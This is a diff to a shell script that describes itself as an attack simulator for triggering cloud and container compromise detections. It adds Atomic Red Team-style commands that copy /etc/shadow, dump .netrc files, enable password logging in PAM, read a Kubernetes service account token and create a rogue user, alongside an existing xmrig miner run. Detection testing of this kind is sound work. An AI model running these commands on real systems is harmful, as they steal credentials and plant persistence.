@@ -5,6 +5,12 @@
 # This can be used an easy way of triggering detections for cloud and container compromise scenarios
 # Do not run this on production systems
 #
+#  ____  _                 _       _
+# / ___|(_)_ __ ___  _   _| | __ _| |_ ___  _ __
+# \___ \| | '_ ` _ \| | | | |/ _` | __/ _ \| '__|
+#  ___) | | | | | | | |_| | | (_| | || (_) | |
+# |____/|_|_| |_| |_|\__,_|_|\__,_|\__\___/|_|
+#
 #
 
 echo = `date` - Setting Up =
@@ -22,6 +28,21 @@ echo "[default]" >> /root/.aws/credentials
 echo "aws_access_key_id = AKAAAAAAA_AccessKey" >> /root/.aws/credentials
 echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials
 
+echo Executing Atomic Tests for Linux
+cat /etc/passwd > /tmp/passwd
+cat /etc/shadow > /tmp/shadow
+# Via https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md
+whoami
+for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
+if  test -f /etc/pam.d/password-auth; then  cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if  test -f /etc/pam.d/system-auth; then  cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;  touch /tmp/password-auth.bk  touch /tmp/system-auth.bk  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
+PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+tail /var/log/syslog
+kubectl --context example-cluster exec test-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
+timeout -s SIGKILL 5 tcpdump -c 5 -nnni en0
+cat /etc/login.defs
+useradd evil_account
+cat ~/.ssh/authorized_keys
 
 echo Installing Docker
 if [ "$(grep -Ei 'debian|buntu|mint' /etc/*release)" ]; then
@@ -148,5 +169,7 @@ echo '1' >/proc/sys/kernel/nmi_watchdog  2>/dev/null
 
 echo Running Stratum Protocol via XMRIG
 timeout -s SIGKILL 20 /tmp/bins/xmrig
+
+
 
 echo `date` - Finished
